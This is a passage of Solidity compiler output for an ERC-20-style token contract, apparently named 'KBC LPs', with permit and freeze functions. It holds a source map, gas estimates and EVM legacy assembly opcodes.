							"sourceMap": "111:4330:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;111:4330:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;175:39;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:100:-1;33:3;30:1;27:10;8:100;;;90:11;;;84:18;71:11;;;64:39;52:2;45:10;8:100;;;12:14;175:39:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2810:147;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2810:147:0;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;307:26;;;:::i;:::-;;;;;;;;;;;;;;;;3108:361;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;3108:361:0;;;;;;;;;;;;;;;;;:::i;656:116::-;;;:::i;266:35::-;;;:::i;:::-;;;;;;;;;;;;;;;;;;;515:31;;;:::i;459:49::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;459:49:0;-1:-1:-1;;;;;459:49:0;;:::i;339:44::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;339:44:0;-1:-1:-1;;;;;339:44:0;;:::i;778:41::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;778:41:0;-1:-1:-1;;;;;778:41:0;;:::i;220:40::-;;;:::i;2963:139::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2963:139:0;;;;;;;;:::i;3475:964::-;;;;;;13:3:-1;8;5:12;2:2;;;30:1;27;20:12;2:2;-1:-1;;;;;;3475:964:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;389:64;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;389:64:0;;;;;;;;;;:::i;175:39::-;;;;;;;;;;;;;;-1:-1:-1;;;175:39:0;;;;:::o;2810:147::-;2877:4;2893:36;2902:10;2914:7;2923:5;2893:8;:36::i;:::-;-1:-1:-1;2946:4:0;2810:147;;;;;:::o;307:26::-;;;;:::o;3108:361::-;-1:-1:-1;;;;;3239:15:0;;3219:4;3239:15;;;:9;:15;;;;;;;;3255:10;3239:27;;;;;;;;-1:-1:-1;;3239:42:0;3235:171;;-1:-1:-1;;;;;3327:15:0;;;;;;:9;:15;;;;;;;;3343:10;3327:27;;;;;;;;:68;;3376:5;3327:68;:31;:68;:::i;:::-;-1:-1:-1;;;;;3297:15:0;;;;;;:9;:15;;;;;;;;3313:10;3297:27;;;;;;;:98;3235:171;3415:26;3425:4;3431:2;3435:5;3415:9;:26::i;:::-;-1:-1:-1;3458:4:0;3108:361;;;;;:::o;656:116::-;706:66;656:116;:::o;266:35::-;299:2;266:35;:::o;515:31::-;;;;:::o;459:49::-;;;;;;;;;;;;;:::o;339:44::-;;;;;;;;;;;;;:::o;778:41::-;;;;;;;;;;;;;:::o;220:40::-;;;;;;;;;;;;;;-1:-1:-1;;;220:40:0;;;;:::o;2963:139::-;3026:4;3042:32;3052:10;3064:2;3068:5;3042:9;:32::i;3475:964::-;3688:15;3676:8;:27;;3668:56;;;;;-1:-1:-1;;;3668:56:0;;;;;;;;;;;;-1:-1:-1;;;3668:56:0;;;;;;;;;;;;;;;3836:16;;-1:-1:-1;;;;;4073:13:0;;;3734:14;4073:13;;;:6;:13;;;;;;;;:15;;;;;;;;;3901:243;;706:66;3901:243;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3901:243:0;;;;;3870:292;;;;;;-1:-1:-1;;;3774:402:0;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3774:402:0;;;;;;3751:435;;;;;;;;;4223:26;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3734:14;;4073:15;4223:26;;;;;-1:-1:-1;;4223:26:0;;;;;;;;;;4073:15;4223:26;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;-1:-1;;4223:26:0;;-1:-1:-1;;4223:26:0;;;-1:-1:-1;;;;;;;4280:30:0;;;;;;:59;;;4334:5;-1:-1:-1;;;;;4314:25:0;:16;-1:-1:-1;;;;;4314:25:0;;4280:59;4259:132;;;;;-1:-1:-1;;;4259:132:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;4401:31;4410:5;4417:7;4426:5;4401:8;:31::i;:::-;3475:964;;;;;;;;;:::o;389:64::-;;;;;;;;;;;;;;;;;;;;;;;;:::o;2410:169::-;-1:-1:-1;;;;;2493:16:0;;;;;;;:9;:16;;;;;;;;:25;;;;;;;;;;;;;:33;;;2541:31;;;;;;;;;;;;;;;;;2410:169;;;:::o;339:136:7:-;431:5;;;426:16;;;;418:50;;;;;-1:-1:-1;;;418:50:7;;;;;;;;;;;;-1:-1:-1;;;418:50:7;;;;;;;;;;;;;;2585:219:0;-1:-1:-1;;;;;2681:15:0;;;;;;:9;:15;;;;;;:26;;2701:5;2681:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2663:15:0;;;;;;;:9;:15;;;;;;:44;;;;2733:13;;;;;;;:24;;2751:5;2733:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;2717:13:0;;;;;;;:9;:13;;;;;;;;;:40;;;;2772:25;;;;;;;2717:13;;2772:25;;;;;;;;;;;;;2585:219;;;:::o;198:135:7:-;290:5;;;285:16;;;;277:49;;;;;-1:-1:-1;;;277:49:7;;;;;;;;;;;;-1:-1:-1;;;277:49:7;;;;;;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "450400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"DOMAIN_SEPARATOR()": "1087",
								"PERMIT_TYPEHASH()": "243",
								"_frozenBalance(address)": "1147",
								"allowance(address,address)": "1305",
								"approve(address,uint256)": "22366",
								"balanceOf(address)": "1169",
								"decimals()": "274",
								"name()": "infinite",
								"nonces(address)": "1191",
								"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
								"symbol()": "infinite",
								"totalSupply()": "1066",
								"transfer(address,uint256)": "infinite",
								"transferFrom(address,address,uint256)": "infinite"
							},
							"internal": {
								"_approve(address,address,uint256)": "infinite",
								"_burn(address,uint256)": "infinite",
								"_mint(address,uint256)": "infinite",
								"_transfer(address,address,uint256)": "infinite",
								"freezeMint(address,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "MSTORE"
								},
								{
									"begin": 1017,
									"end": 1502,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "MLOAD"
								},
								{
									"begin": 1107,
									"end": 1114,
									"name": "CHAINID"
								},
								{
									"begin": 1107,
									"end": 1114,
									"name": "SWAP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH data",
									"value": "8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "CODECOPY"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "MLOAD"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SWAP2"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SWAP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SUB"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "ADD"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "KECCAK256"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "ADD"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "PUSH",
									"value": "7"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP4"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "4B4243204C5073"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "C8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "SWAP4"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP5"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "ADD"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP2"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MLOAD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP4"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "ADD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP4"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP2"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "31"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "F8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "SWAP1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP5"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "ADD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MLOAD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1354,
									"end": 1376,
									"name": "PUSH",
									"value": "6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP4"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1394,
									"end": 1415,
									"name": "PUSH",
									"value": "C89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "60"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1466,
									"end": 1470,
									"name": "ADDRESS"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP7"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MLOAD"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP1"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP7"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "SUB"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP1"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP2"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "ADD"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "DUP2"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "C0"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "DUP3"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "MLOAD"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP3"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "ADD"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP2"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP1"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP2"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "KECCAK256"
								},
								{
									"begin": 1133,
									"end": 1149,
									"name": "PUSH",
									"value": "4"
								},
								{
									"begin": 1133,
									"end": 1495,
									"name": "SSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "DUP1"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "CODECOPY"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 111,
									"end": 4441,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a7231582000d3a072e2b19d1942fd6ff86893a1396bba021b0fb0958be6ff3a10da49b7d464736f6c63430005100032",
									".code": [
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "MSTORE"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "POP"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "LT"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "SHR"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "GT"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "GT"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "D505ACCF"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMP"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "7ECEBE00"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMP"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "GT"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "30ADF81F"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "313CE567"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "3644E515"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMP"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "6FDDE03"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "18160DDD"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "EQ"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPI"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "JUMPDEST"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "DUP1"
										},
										{
											"begin": 111,
											"end": 4441,
											"name": "REVERT"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP6"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
